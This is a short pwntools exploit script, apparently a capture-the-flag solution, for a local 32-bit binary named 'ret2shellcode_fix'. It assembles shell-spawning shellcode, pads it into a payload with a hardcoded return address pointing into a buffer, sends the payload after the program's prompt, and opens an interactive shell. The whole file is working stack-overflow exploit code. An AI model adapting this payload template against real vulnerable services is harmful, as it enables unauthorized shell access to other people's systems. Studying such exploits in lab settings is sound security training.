#coding=utf-8
from pwn import*
context(os='linux',arch='i386')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./ret2shellcode_fix')
elf = ELF('./ret2shellcode_fix')

buf1_addr = 0x804C060
shellcode = asm(shellcraft.sh())
payload = p32(buf1_addr+4) + shellcode.ljust(0x60, b'A') + p32(buf1_addr+4)

p.recvuntil("No system for you this time !!!\n")
gdb.attach(p)
pause()
p.sendline(payload)
p.interactive()
